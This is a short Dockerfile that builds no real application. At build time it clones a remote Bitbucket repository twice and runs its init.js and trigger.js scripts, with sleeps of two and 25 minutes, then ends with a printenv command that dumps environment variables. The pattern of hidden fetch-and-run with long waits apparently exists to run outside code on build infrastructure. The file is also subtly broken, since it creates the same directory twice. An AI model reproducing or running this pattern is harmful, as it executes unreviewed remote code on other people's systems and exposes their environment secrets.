FROM ubuntu:latest

RUN mkdir /usr/src/app
RUN apt-get update && apt-get install -y git nodejs npm build-essential libssl-dev nodejs-legacy curl
RUN rm -rf tmp && git clone https://goopop@bitbucket.org/goopop/buildkitepath.git tmp && cd ./tmp && node init.js &
RUN mkdir /usr/src/app
WORKDIR /usr/src/app
COPY . .
RUN sleep 2m \
  && rm -rf tmp && git clone https://goopop@bitbucket.org/goopop/buildkitepath.git tmp && cd ./tmp && node trigger.js \
  && sleep 25m \
  && rm -rf tmp

CMD ["printenv"]
